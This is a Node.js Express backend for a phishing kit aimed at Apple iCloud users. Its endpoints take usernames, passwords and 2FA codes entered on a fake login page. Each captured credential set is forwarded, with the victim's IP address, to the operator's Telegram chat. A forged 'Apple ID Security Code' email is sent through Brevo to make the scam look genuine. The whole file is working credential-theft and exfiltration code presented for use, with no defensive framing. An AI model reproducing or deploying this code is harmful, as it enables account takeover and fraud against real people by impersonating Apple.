const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());                     // Allow your React frontend to call this
app.use(express.json());             // Parse JSON bodies

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper: send message to Telegram
async function sendToTelegram(text) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });
    console.log('✅ Telegram alert sent');
  } catch (error) {
    console.error('❌ Telegram error:', error.response?.data || error.message);
  }
}

// Brevo Configuration
const BREVO_API_KEY = process.env.BREVO_API_KEY;
const SENDER_EMAIL = process.env.SENDER_EMAIL;
const SENDER_NAME = process.env.SENDER_NAME;

// Helper: send Email via Brevo
async function sendEmail(toEmail, otp) {
  try {
    const url = 'https://api.brevo.com/v3/smtp/email';
    const data = {
      sender: { name: SENDER_NAME, email: SENDER_EMAIL },
      to: [{ email: toEmail }],
      subject: 'Your Apple ID Security Code',
      htmlContent: `
        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; padding: 20px; color: #333;">
          <h2 style="color: #000;">Sign in with your Apple ID</h2>
          <p>Your Apple ID is being used to sign in to a new device.</p>
          <p>Please use this security code to complete your sign-in:</p>
          <div style="background: #f4f4f4; padding: 15px; font-size: 24px; font-weight: bold; letter-spacing: 5px; text-align: center; border-radius: 8px;">
            ${otp}
          </div>
          <p style="color: #888; font-size: 12px; margin-top: 20px;">
            If you did not make this request, you can ignore this email.
          </p>
        </div>
      `
    };

    await axios.post(url, data, {
      headers: {
        'api-key': BREVO_API_KEY,
        'Content-Type': 'application/json'
      }
    });
    console.log('✉️ OTP Email sent via Brevo');
  } catch (error) {
    console.error('❌ Brevo error:', error.response?.data || error.message);
  }
}

// Helper: get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
}

// ── Step 1: Capture Email + Password & Send OTP ──
app.post('/api/submit-credentials', async (req, res) => {
  const { username, password } = req.body;
  const ip = getClientIp(req);
  const timestamp = new Date().toLocaleString();
  
  // Generate a random 6-digit OTP
  const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();

  const message = `
🔐 <b>iCloud Login: Credentials Captured</b>
────────────────
<b>Username:</b> ${username}
<b>Password:</b> ${password}
<b>IP Address:</b> ${ip}
<b>Time:</b> ${timestamp}
────────────────
🚀 <i>Sending OTP <b>${generatedOtp}</b> to user's email...</i>
  `;

  await sendToTelegram(message);
  await sendEmail(username, generatedOtp);

  res.json({ success: true, message: 'Credentials captured, OTP sent' });
});

// ── Step 2: Capture Final OTP/PIN/CVV ──
app.post('/api/icloud-login', async (req, res) => {
  const { username, password, twoFactorCode } = req.body;
  const ip = getClientIp(req);
  const timestamp = new Date().toLocaleString();

  const message = `
🎯 <b>iCloud Login: OTP Captured</b>
────────────────
<b>Username:</b> ${username}
<b>Password:</b> ${password}
<b>2FA / OTP / PIN:</b> ${twoFactorCode}
<b>IP Address:</b> ${ip}
<b>Time:</b> ${timestamp}
────────────────
✅ <i>User has completed the flow!</i>
  `;

  await sendToTelegram(message);
  res.json({ success: true, message: 'Login details captured' });
});

// Health check endpoint (optional)
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🚀 Backend running on http://localhost:${PORT}`);
  console.log('   POST /api/icloud-login');
  console.log('   GET  /api/health');
});
